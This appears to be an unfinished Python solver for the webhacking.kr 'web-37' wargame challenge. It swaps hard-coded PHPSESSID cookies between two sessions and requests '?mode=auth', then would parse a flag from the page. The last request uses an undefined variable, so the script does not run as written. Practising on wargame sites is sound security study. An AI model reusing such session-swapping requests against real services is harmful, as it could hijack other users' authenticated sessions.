from bs4 import BeautifulSoup
import requests

URL = "https://webhacking.kr/challenge/web-37"
URI = "/"
PAYLOAD = "?mode=auth"
PHPSESSID = '2iti1mqblclscqcnp08irp82q2'

COOKIES = {
    'PHPSESSID' : PHPSESSID
}

session01 = requests.Session()
session02 = requests.Session()

# 풀이
# 1. 

resp = session01.get(URL + URI, cookies=COOKIES)

COOKIES = {
    'PHPSESSID' : 'r8gl8po61acpl16mpkrnr47eie'
}

resp = session02.get(URL + URI + PAYLOAD, cookies=COOKIES)

COOKIES = {
    'PHPSESSID' : PHPSESSID
}

print(resp.text)

resp = session.get(URL + URI + PAYLOAD, cookies=COOKIES)

print(resp.text)

'''
soup = BeautifulSoup(resp.content,"html.parser")
flag = soup.find('script').contents[0].replace('\n', '')

print(flag)
'''